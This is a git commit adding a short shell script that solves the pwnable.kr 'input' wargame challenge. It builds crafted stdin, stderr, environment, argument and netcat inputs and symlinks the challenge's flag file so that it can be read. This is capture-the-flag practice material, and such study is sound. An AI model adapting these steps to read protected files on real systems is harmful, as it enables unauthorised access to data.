cd88a63524e42815ea5415c61b6921b2397fe935
backcover7 <hou1417x@gmail.com>
2020-04-04 17:17:23 -0400

    Add files via upload

---
+++ pwnable.kr/input2.sh
@@ -0,0 +1,9 @@
+mkdir /tmp/bh
+cd /tmp/bh
+ln -s /home/input2/flag
+ln -s /home/input2/input
+echo "00 00 0a 00 ff" | xxd -r > /tmp/bh/stdio.dat;
+echo "00 00 0a 02 ff" | xxd -r > /tmp/bh/stderr.dat;
+echo "00 de ad be ef" | xxd -r > /tmp/bh/netcat.dat;
+echo "00 00 00 00 00" | xxd -r > $'\x0a';
+env $'\xde\xad\xbe\xef'=$'\xca\xfe\xba\xbe' ./input A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A $'\0' $' \n\r' 29001 A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A 0< /tmp/bh/stdio.dat 2< /tmp/bh/stderr.dat > readable_flag.dat&nc localhost 29001 < /tmp/bh/netcat.dat > /tmp/bh/netcat.out;
